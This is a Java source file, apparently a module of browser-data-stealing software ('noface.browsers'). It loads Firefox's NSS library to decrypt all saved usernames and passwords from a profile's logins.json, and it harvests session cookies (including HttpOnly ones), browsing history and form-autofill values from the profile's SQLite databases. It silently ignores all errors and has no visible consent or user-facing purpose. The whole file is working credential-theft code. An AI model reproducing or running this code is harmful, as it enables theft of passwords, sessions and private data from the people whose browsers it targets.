package noface.browsers;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public final class Firefox {

    public static class SecItem extends Structure {
        public int type;
        public Pointer data;
        public int len;
        @Override protected List<String> getFieldOrder() { return List.of("type", "data", "len"); }
    }

    public interface Nss extends Library {
        int NSS_Init(String configdir);
        Pointer PK11_GetInternalKeySlot();
        int PK11_Authenticate(Pointer slot, boolean loadCerts, Pointer wincx);
        int PK11SDR_Decrypt(SecItem data, SecItem result, Pointer cx);
        void PK11_FreeSlot(Pointer slot);
    }

    private static Nss nss;
    private static boolean ready;

    private static synchronized boolean init(String profilePath) {
        if (ready) return true;
        try {
            String dir = findNss();
            if (dir == null) return false;
            System.setProperty("jna.library.path", dir);
            nss = Native.load("nss3", Nss.class);
            if (nss.NSS_Init(profilePath) != 0) return false;
            ready = true;
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static String findNss() {
        String[] paths = {
            System.getenv("PROGRAMFILES") + "\\Mozilla Firefox",
            System.getenv("PROGRAMFILES(X86)") + "\\Mozilla Firefox",
            System.getenv("LOCALAPPDATA") + "\\Mozilla Firefox"
        };
        for (String p : paths) {
            if (p != null && new File(p, "nss3.dll").exists()) return p;
        }
        return null;
    }

    public static List<Pass.Entry> passwords(Profile profile) {
        List<Pass.Entry> out = new ArrayList<>();
        if (!init(profile.dir().toAbsolutePath().toString())) return out;
        try {
            Pointer slot = nss.PK11_GetInternalKeySlot();
            if (slot == null) return out;
            nss.PK11_Authenticate(slot, true, Pointer.NULL);
            Path logins = profile.dir().resolve("logins.json");
            if (Files.exists(logins)) {
                String json = Files.readString(logins);
                String[] parts = json.split("\"hostname\":");
                for (int i = 1; i < parts.length; i++) {
                    try {
                        String part = parts[i];
                        String url = pick(part, "");
                        String encUser = pick(part, "\"encryptedUsername\":");
                        String encPass = pick(part, "\"encryptedPassword\":");
                        if (encUser != null && encPass != null) {
                            String user = dec(encUser);
                            String pass = dec(encPass);
                            if (pass != null && !pass.isEmpty()) {
                                out.add(new Pass.Entry(url, user == null ? "" : user, pass));
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }
            nss.PK11_FreeSlot(slot);
        } catch (Throwable ignored) {}
        return out;
    }

    public static List<Cookie.Entry> cookies(Profile profile) {
        List<Cookie.Entry> out = new ArrayList<>();
        Path db = profile.dir().resolve("cookies.sqlite");
        if (!Files.exists(db)) return out;
        String sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies";
        Db.query(db, sql, rs -> {
            try {
                out.add(new Cookie.Entry(
                    rs.getString("host"), rs.getString("name"), rs.getString("value"),
                    rs.getString("path"), rs.getLong("expiry"),
                    rs.getBoolean("isSecure"), rs.getBoolean("isHttpOnly")
                ));
            } catch (Exception ignored) {}
        });
        return out;
    }

    public static List<Hist.Entry> history(Profile profile) {
        List<Hist.Entry> out = new ArrayList<>();
        Path db = profile.dir().resolve("places.sqlite");
        if (!Files.exists(db)) return out;
        String sql = "SELECT url, title, visit_count, last_visit_date FROM moz_places "
                + "WHERE url IS NOT NULL AND length(url) > 0 ORDER BY last_visit_date DESC LIMIT 2000";
        Db.query(db, sql, rs -> {
            try {
                String url = rs.getString(1);
                String title = rs.getString(2);
                int visits = rs.getInt(3);
                long t = rs.getLong(4);
                if (url != null && !url.isBlank()) {
                    out.add(new Hist.Entry(url, title == null ? "" : title, visits, t));
                }
            } catch (Exception ignored) {}
        });
        return out;
    }

    public static List<Fill.Entry> form(Profile profile) {
        List<Fill.Entry> out = new ArrayList<>();
        Path db = profile.dir().resolve("formhistory.sqlite");
        if (!Files.exists(db)) return out;
        String sql = "SELECT fieldname, value, timesUsed FROM moz_formhistory "
                + "WHERE value IS NOT NULL AND length(value) > 0 LIMIT 2000";
        Db.query(db, sql, rs -> {
            try {
                String name = rs.getString(1);
                String value = rs.getString(2);
                int count = 0;
                try { count = rs.getInt(3); } catch (Exception ignored) {}
                if (value != null && !value.isBlank()) {
                    out.add(new Fill.Entry(name == null ? "" : name, value, count));
                }
            } catch (Exception ignored) {}
        });
        return out;
    }

    private static String dec(String base64) {
        try {
            byte[] decoded = Base64.getDecoder().decode(base64);
            Pointer ptr = new com.sun.jna.Memory(decoded.length);
            ptr.write(0, decoded, 0, decoded.length);
            SecItem in = new SecItem();
            in.type = 0; in.data = ptr; in.len = decoded.length;
            SecItem out = new SecItem();
            if (nss.PK11SDR_Decrypt(in, out, Pointer.NULL) == 0 && out.len > 0) {
                return new String(out.data.getByteArray(0, out.len), "UTF-8");
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private static String pick(String source, String key) {
        int idx = key.isEmpty() ? 0 : source.indexOf(key);
        if (idx == -1) return null;
        idx += key.length();
        int start = source.indexOf('"', idx);
        if (start == -1) return null;
        int end = source.indexOf('"', start + 1);
        if (end == -1) return null;
        return source.substring(start + 1, end);
    }

    private Firefox() {}
}
